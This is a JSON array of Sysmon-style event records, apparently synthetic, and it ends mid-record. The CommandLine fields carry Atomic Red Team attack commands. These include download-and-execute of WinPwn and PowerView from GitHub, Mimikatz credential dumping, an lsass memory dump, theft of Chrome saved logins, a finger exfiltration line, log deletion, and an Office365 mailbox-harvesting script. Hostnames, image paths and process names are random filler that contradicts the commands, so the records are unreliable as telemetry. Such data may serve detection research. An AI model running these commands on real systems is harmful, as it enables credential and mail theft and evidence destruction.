    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-18.brown.org",
        "User": "thomas44",
        "ProcessID": 1347,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"poweroff\\n\",",
        "LogonID": 429634,
        "LogonGuid": "5715bf37-74a4-4811-bb3b-c8cf43aba408",
        "SourceProcessID": 7191,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\relationship..exe",
        "DestinationProcessID": 2661,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Windows\\majority..exe",
        "UtcTime": "2024-05-17T01:36:51.780437Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-94.harris-mosley.net",
        "User": "triciahunter",
        "ProcessID": 2018,
        "ProcessName": "nc.exe",
        "CommandLine": "\"reg query HKEY_LOCAL_MACHINE\\\\HARDWARE\\\\DESCRIPTION\\\\System /v SystemBiosVersion\\nreg query HKEY_LOCAL_MACHINE\\\\HARDWARE\\\\DESCRIPTION\\\\System /v VideoBiosVersion\\n\",",
        "LogonID": 642538,
        "LogonGuid": "4714cab8-0e52-43e2-8572-f7136a254b27",
        "SourceProcessID": 2646,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\forget..exe",
        "DestinationProcessID": 7971,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\Congress..dll",
        "UtcTime": "2024-05-17T01:36:51.781456Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-48.mccall-watson.com",
        "User": "catherinealexander",
        "ProcessID": 1963,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"&\\\"$PathToAtomicsFolder\\\\T1056.001\\\\src\\\\Get-Keystrokes.ps1\\\" -LogPath #{filepath}\\n\",",
        "LogonID": 349555,
        "LogonGuid": "c5cc6219-ded4-4d70-add5-3d85e8b5861a",
        "SourceProcessID": 3805,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\method..dll",
        "DestinationProcessID": 1305,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\able..dll",
        "UtcTime": "2024-05-17T01:36:51.781456Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-33.reed-brewer.com",
        "User": "jessicahodge",
        "ProcessID": 9710,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"net localgroup\\nnet localgroup \\\"Administrators\\\"\\n\",",
        "LogonID": 924549,
        "LogonGuid": "aacd3d6d-037d-4a7c-ae2d-9a68032528d7",
        "SourceProcessID": 3528,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\will..exe",
        "DestinationProcessID": 2453,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\these..exe",
        "UtcTime": "2024-05-17T01:36:51.781456Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-79.meyer.com",
        "User": "anthonyrichard",
        "ProcessID": 3657,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nDotnetsearch -noninteractive -consoleoutput\",",
        "LogonID": 704605,
        "LogonGuid": "26983e40-72a2-42bf-9c9c-2df24f1eb065",
        "SourceProcessID": 4718,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\message..exe",
        "DestinationProcessID": 6574,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\whose..exe",
        "UtcTime": "2024-05-17T01:36:51.781456Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-29.garcia-mendez.biz",
        "User": "hwhite",
        "ProcessID": 6021,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"useradd --create-home --shell /bin/bash art\\nsu --login art\\necho 'echo \\\"Atomic Red Team was here... T1546.004\\\" >> $HOME/art.txt' >> $HOME/.bash_logout\\n\",",
        "LogonID": 711671,
        "LogonGuid": "2524e620-9d4a-4c0d-a5fb-81ef989c259f",
        "SourceProcessID": 8308,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\according..dll",
        "DestinationProcessID": 5909,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\scientist..exe",
        "UtcTime": "2024-05-17T01:36:51.781456Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-96.hamilton.biz",
        "User": "fevans",
        "ProcessID": 4652,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Copy-Item \\\"$env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\\\" -Destination \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\"\\nCopy-Item \\\"$env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data For Account\\\" -Destination \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\"\\n\",",
        "LogonID": 296792,
        "LogonGuid": "f8f5cbaf-e235-458d-b137-fd28c6943ef5",
        "SourceProcessID": 2879,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\true..dll",
        "DestinationProcessID": 3059,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\total..dll",
        "UtcTime": "2024-05-17T01:36:51.782457Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-99.glover.com",
        "User": "yesenia94",
        "ProcessID": 3201,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"Start-Process -FilePath \\\"#{autoit_path}\\\" -ArgumentList \\\"#{script_path}\\\"\\n\",",
        "LogonID": 503322,
        "LogonGuid": "b853bbd0-8b55-4b1b-8a02-54bad427e8bf",
        "SourceProcessID": 2939,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\next..exe",
        "DestinationProcessID": 9761,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\trouble..dll",
        "UtcTime": "2024-05-17T01:36:51.782457Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-90.wilkinson.org",
        "User": "rebeccamartin",
        "ProcessID": 7832,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"echo \\\"block in proto tcp from 1.2.3.4 to any\\\" | pfctl -a pf-rules -f -\\npfctl -a pf-rules -s rules\\n\",",
        "LogonID": 625605,
        "LogonGuid": "0a5b6151-6ac6-4524-ab65-d229a822f1d9",
        "SourceProcessID": 7467,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\cup..exe",
        "DestinationProcessID": 5866,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\anything..exe",
        "UtcTime": "2024-05-17T01:36:51.782457Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-91.vasquez.com",
        "User": "xcoleman",
        "ProcessID": 8933,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"\\\"#{Path_to_file}\\\" 1>NUL \\n\",",
        "LogonID": 437870,
        "LogonGuid": "f001b545-7d66-48fe-afe0-82c1a9247c61",
        "SourceProcessID": 3763,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\lot..dll",
        "DestinationProcessID": 7184,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\from..exe",
        "UtcTime": "2024-05-17T01:36:51.782457Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-41.frye.com",
        "User": "ashleyparrish",
        "ProcessID": 4540,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\npowershellsensitive -consoleoutput -noninteractive\",",
        "LogonID": 723318,
        "LogonGuid": "c46bf9ef-95b3-4f82-8609-1728432ed636",
        "SourceProcessID": 7669,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\stop..dll",
        "DestinationProcessID": 8334,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\check..exe",
        "UtcTime": "2024-05-17T01:36:51.782457Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-74.gonzalez.net",
        "User": "fkelly",
        "ProcessID": 7030,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"$process = Start-Process #{spawn_process_path} -passthru\\n$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\RtlCreateUserThread.exe -pid $process.Id -debug\\n\",",
        "LogonID": 591954,
        "LogonGuid": "37ca4318-193a-49e8-9c56-14fe2fc02b86",
        "SourceProcessID": 3347,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\course..dll",
        "DestinationProcessID": 9395,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\away..exe",
        "UtcTime": "2024-05-17T01:36:51.782457Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-97.murphy.com",
        "User": "angela01",
        "ProcessID": 7214,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nSharpCloud -consoleoutput -noninteractive  \",",
        "LogonID": 714199,
        "LogonGuid": "b6df7a16-0fe9-46ee-9b30-7a523a1c5fcb",
        "SourceProcessID": 9499,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\surface..exe",
        "DestinationProcessID": 9001,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\gun..exe",
        "UtcTime": "2024-05-17T01:36:51.783458Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-93.king-white.com",
        "User": "marccox",
        "ProcessID": 2440,
        "ProcessName": "nc.exe",
        "CommandLine": "\"echo T1486 - Purelocker Ransom Note > %USERPROFILE%\\\\Desktop\\\\YOUR_FILES.txt\\n\",",
        "LogonID": 156548,
        "LogonGuid": "c4028f82-e58f-4fa1-ba2f-b38cd2a8bf23",
        "SourceProcessID": 7393,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\require..dll",
        "DestinationProcessID": 7388,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\hair..exe",
        "UtcTime": "2024-05-17T01:36:51.783458Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-42.harrell.biz",
        "User": "eriksmith",
        "ProcessID": 1580,
        "ProcessName": "malware.exe",
        "CommandLine": "\"finger base64_filedata@#{remote_host}\\n\",",
        "LogonID": 884681,
        "LogonGuid": "37095eee-75b5-46d5-8505-f989036b08db",
        "SourceProcessID": 6033,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\policy..dll",
        "DestinationProcessID": 4675,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\smile..dll",
        "UtcTime": "2024-05-17T01:36:51.783458Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-09.sharp-anderson.com",
        "User": "taylorfrank",
        "ProcessID": 4916,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"reg query HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Nls\\\\Language\\n\",",
        "LogonID": 420336,
        "LogonGuid": "d370800a-b7c6-4484-b2bd-9b9af9ff2422",
        "SourceProcessID": 3964,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\student..dll",
        "DestinationProcessID": 9860,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\similar..dll",
        "UtcTime": "2024-05-17T01:36:51.783458Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-14.carpenter.com",
        "User": "chavezbrandon",
        "ProcessID": 7973,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg add HKEY_CURRENT_USER\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 549434,
        "LogonGuid": "32b07523-d2e1-41e5-84e9-b7e5d3189941",
        "SourceProcessID": 2620,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Windows\\Congress..exe",
        "DestinationProcessID": 6494,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\assume..exe",
        "UtcTime": "2024-05-17T01:36:51.784456Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-57.perez.biz",
        "User": "chayes",
        "ProcessID": 4549,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"Start-Process -FilePath #{parent_name} -PassThru | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'\",",
        "LogonID": 661026,
        "LogonGuid": "a6f488e2-535d-4d91-b393-f5d7a13c2dba",
        "SourceProcessID": 3472,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\while..exe",
        "DestinationProcessID": 5467,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\example..dll",
        "UtcTime": "2024-05-17T01:36:51.784456Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-08.jackson.com",
        "User": "scott04",
        "ProcessID": 5647,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"get-localgroup\\nGet-LocalGroupMember -Name \\\"Administrators\\\"\\n\",",
        "LogonID": 943352,
        "LogonGuid": "8b8a2bb2-21f3-45eb-9e68-0b5bc7c8474b",
        "SourceProcessID": 8219,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\bill..dll",
        "DestinationProcessID": 6336,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\score..exe",
        "UtcTime": "2024-05-17T01:36:51.784456Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-41.williams-morgan.biz",
        "User": "robertsandrew",
        "ProcessID": 5092,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\\nsafedump -consoleoutput -noninteractive\",",
        "LogonID": 340891,
        "LogonGuid": "f2e3868d-b292-4517-bc3d-42e280d03ab8",
        "SourceProcessID": 4558,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\property..exe",
        "DestinationProcessID": 4812,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\peace..exe",
        "UtcTime": "2024-05-17T01:36:51.784456Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-92.jensen.com",
        "User": "robert19",
        "ProcessID": 4084,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\\n\",",
        "LogonID": 388639,
        "LogonGuid": "9e6364a4-c79e-4e85-9336-6003ad26fe83",
        "SourceProcessID": 8573,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\everybody..exe",
        "DestinationProcessID": 4873,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\standard..exe",
        "UtcTime": "2024-05-17T01:36:51.784456Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "lt-21.pierce.com",
        "User": "taylor83",
        "ProcessID": 1590,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v HideClock /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 112085,
        "LogonGuid": "c282f72d-19db-4c0d-abb3-462d9caec1e2",
        "SourceProcessID": 6453,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\task..exe",
        "DestinationProcessID": 8282,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\its..dll",
        "UtcTime": "2024-05-17T01:36:51.784456Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-65.stevens.com",
        "User": "fowleramy",
        "ProcessID": 5595,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"which_python=$(which python || which python3 || which python3.9 || which python2)\\n$which_python -c \\\"import pty;pty.spawn('/bin/sh')\\\"\\nexit\\n$which_python -c \\\"import pty;pty.spawn('/bin/bash')\\\"\\nexit\",",
        "LogonID": 824081,
        "LogonGuid": "6effa9aa-c7fc-496d-9841-e58ab496e210",
        "SourceProcessID": 1167,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\economy..exe",
        "DestinationProcessID": 5808,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\direction..exe",
        "UtcTime": "2024-05-17T01:36:51.785456Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-98.gonzales-hines.com",
        "User": "dortega",
        "ProcessID": 1208,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"# Encoded payload in next command is the following \\\"Set-Content -path \\\"$env:SystemRoot/Temp/art-marker.txt\\\" -value \\\"Hello from the Atomic Red Team\\\"\\\"\\nreg.exe add \\\"HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\AtomicRedTeam\\\" /v ART /t REG_SZ /d \\\"U2V0LUNvbnRlbnQgLXBhdGggIiRlbnY6U3lzdGVtUm9vdC9UZW1wL2FydC1tYXJrZXIudHh0IiAtdmFsdWUgIkhlbGxvIGZyb20gdGhlIEF0b21pYyBSZWQgVGVhbSI=\\\" /f\\niex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\\\\Software\\\\Classes\\\\AtomicRedTeam').ART)))\\n\",",
        "LogonID": 971144,
        "LogonGuid": "711ffb61-112d-46d4-a669-f858cf5f010f",
        "SourceProcessID": 6091,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\side..exe",
        "DestinationProcessID": 3873,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\moment..dll",
        "UtcTime": "2024-05-17T01:36:51.785456Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-07.hicks-klein.info",
        "User": "thomas18",
        "ProcessID": 5535,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"rm -rf /var/log/messages\\nrm -rf /var/log/security\\n\",",
        "LogonID": 991354,
        "LogonGuid": "12a03b0c-3f4f-495d-8eb2-dc71a24ceb64",
        "SourceProcessID": 9042,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\example..exe",
        "DestinationProcessID": 6897,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\event..dll",
        "UtcTime": "2024-05-17T01:36:51.785456Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-75.thomas-harris.org",
        "User": "hdaniels",
        "ProcessID": 3036,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"C:\\\\Windows\\\\System32\\\\inetsrv\\\\appcmd.exe list apppool /config\",",
        "LogonID": 611149,
        "LogonGuid": "afb2043f-901f-40be-aa9b-7de6253f8bb0",
        "SourceProcessID": 8473,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\professional..dll",
        "DestinationProcessID": 2415,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\price..exe",
        "UtcTime": "2024-05-17T01:36:51.785456Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-15.gonzalez.info",
        "User": "wwilliams",
        "ProcessID": 6776,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"tasklist | findstr #{process_to_enumerate}\\n\",",
        "LogonID": 864810,
        "LogonGuid": "a09e014e-c795-47ef-a537-5f5dfb5bc83c",
        "SourceProcessID": 3032,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\determine..dll",
        "DestinationProcessID": 5724,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\modern..exe",
        "UtcTime": "2024-05-17T01:36:51.785456Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "db-93.dickerson.net",
        "User": "leekaren",
        "ProcessID": 4392,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}\",",
        "LogonID": 234054,
        "LogonGuid": "480474f9-ab40-4d8f-adc5-447ab60f1c80",
        "SourceProcessID": 3295,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\majority..exe",
        "DestinationProcessID": 2955,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\choose..exe",
        "UtcTime": "2024-05-17T01:36:51.786460Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-81.cruz-hernandez.com",
        "User": "crussell",
        "ProcessID": 8067,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine\\n\",",
        "LogonID": 210446,
        "LogonGuid": "cab24a9c-3c7b-4d5b-9263-4a78814d34a9",
        "SourceProcessID": 7042,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\if..exe",
        "DestinationProcessID": 6708,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\course..dll",
        "UtcTime": "2024-05-17T01:36:51.786460Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-17.harrington-owens.com",
        "User": "castrojessica",
        "ProcessID": 5081,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \\\"Domain Admins\\\"\\n\",",
        "LogonID": 389890,
        "LogonGuid": "52c17f22-e229-4478-80c2-0e79d7fb806f",
        "SourceProcessID": 1141,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\for..exe",
        "DestinationProcessID": 1830,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\degree..exe",
        "UtcTime": "2024-05-17T01:36:51.786460Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-92.barnes.com",
        "User": "shannonrichards",
        "ProcessID": 7546,
        "ProcessName": "malware.exe",
        "CommandLine": "\"$ss = ConvertTo-SecureString \\\"#{password}\\\" -AsPlainText -Force\\n$cred = New-Object PSCredential -ArgumentList '#{username}', $ss\\n$param = @{\\n    Credential = $cred\\n    Force      = $true\\n}\\n$null = Connect-AzAccount @param\\n$token = (Get-AzAccessToken -ResourceTypeName MSGraph -ErrorAction Stop).token\\n$cert = New-SelfSignedCertificate -Subject \\\"CN=PowerShell Application\\\" -CertStoreLocation \\\"Cert:\\\\CurrentUser\\\\My\\\" -KeyExportPolicy Exportable -KeySpec Signature -KeyLength 2048 -KeyAlgorithm RSA -HashAlgorithm SHA256\\n$reqResourceAccess = ( @{ \\\"resourceAccess\\\" = (@{\\\"id\\\"= \\\"570282fd-fa5c-430d-a7fd-fc8dc98a9dca\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{ \\\"id\\\"= \\\"7427e0e9-2fba-42fe-b0c0-848c9e6a8182\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{\\\"id\\\"= \\\"37f7f235-527c-4136-accd-4a02d197296e\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{\\\"id\\\"= \\\"14dad69e-099b-42c9-810b-d002981feec1\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{ \\\"id\\\"= \\\"e1fe6dd8-ba31-4d61-89e7-88639da4683d\\\"; \\\"type\\\"= \\\"Scope\\\"}, @{ \\\"id\\\"= \\\"810c84a8-4a9e-49e6-bf7d-12d183f40d01\\\"; \\\"type\\\"= \\\"Role\\\"}); \\\"resourceAppId\\\" = \\\"00000003-0000-0000-c000-000000000000\\\" })\\nconnect-mggraph -AccessToken $token\\n$context = Get-MgContext       \\n$users = get-MgUser\\n$app = New-MgApplication -DisplayName \\\"T1114.002 Atomic Test #1 - Office365 - Remote Email Collection\\\" -RequiredResourceAccess $reqResourceAccess -Web @{ RedirectUris=\\\"http://localhost\\\"; } -KeyCredentials @(@{ Type=\\\"AsymmetricX509Cert\\\"; Usage=\\\"Verify\\\"; Key=$cert.RawData })\\nNew-MgServicePrincipal -AppId $app.appId -AdditionalProperties @{} | Out-Null\\n$resourceSPN = Get-MgServicePrincipal -Filter \\\"AppId eq '$($app.AppId)'\\\"\\n$graphApiApp = Get-MgServicePrincipal -Filter \\\"DisplayName eq 'Microsoft Graph'\\\"\\n$mailRole = $graphApiApp.AppRoles|Where-Object Value -Eq \\\"Mail.Read\\\"\\nNew-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $resourceSPN.Id -PrincipalId $resourceSPN.Id -ResourceId $graphApiApp.id -AppRoleId $mailRole.Id\\n$mailbox1 = \\\"#{1st_target_mailbox}\\\"\\n$mailbox2 = \\\"#{2nd_target_mailbox}\\\"\\n$mailbox3 = \\\"#{3rd_target_mailbox}\\\"\\n[System.Collections.ArrayList]$selectUsers = @()\\nforeach ($user in $users) {if (($user.Mail -eq $mailbox1) -Or ($user.Mail -eq $mailbox2) -Or ($user.Mail -eq $mailbox3)){$selectUsers.Add($user.id)}}\\nconnect-mggraph -ClientId $app.AppId -TenantId $context.TenantId -CertificateName $cert.Subjectname.Name\\nforeach ($user in $selectUsers) { $url= \\\"https://graph.microsoft.com/v1.0/users/$($user)/messages\\\" ; Invoke-MgGraphRequest -Uri $url -Method GET -OutputType PSObject}\\n\",",
        "LogonID": 926697,
        "LogonGuid": "2578b40d-0c62-49eb-9560-c9a71d649655",
        "SourceProcessID": 3842,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\per..exe",
        "DestinationProcessID": 9426,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\policy..dll",
        "UtcTime": "2024-05-17T01:36:51.787461Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-72.cohen.net",
        "User": "klawrence",
        "ProcessID": 6073,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"#{msi_exe} /y \\\"#{dll_payload}\\\"\\n\",",
        "LogonID": 129391,
        "LogonGuid": "bd1b7925-3de0-4ffc-9a2f-ef4f2c067307",
        "SourceProcessID": 1974,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\whole..exe",
        "DestinationProcessID": 1091,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\reveal..dll",
        "UtcTime": "2024-05-17T01:36:51.787461Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-65.hudson-morris.com",
        "User": "swells",
        "ProcessID": 3097,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"\\\"#{procdump_exe}\\\" -accepteula -ma lsass.exe #{output_file}\\n\",",
        "LogonID": 990576,
        "LogonGuid": "ba0a09b1-1c8f-4fb9-9cac-6c24f72878a7",
        "SourceProcessID": 6016,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\treatment..dll",
        "DestinationProcessID": 7207,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\economy..dll",
        "UtcTime": "2024-05-17T01:36:51.787461Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-21.hudson.com",
        "User": "isaac26",
        "ProcessID": 5662,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"Remove-Item -path #{file_to_delete}\\n\",",
        "LogonID": 346781,
        "LogonGuid": "3884ba18-b325-4f52-9300-8212d4c1cc14",
        "SourceProcessID": 3279,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\threat..dll",
        "DestinationProcessID": 9593,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\rest..dll",
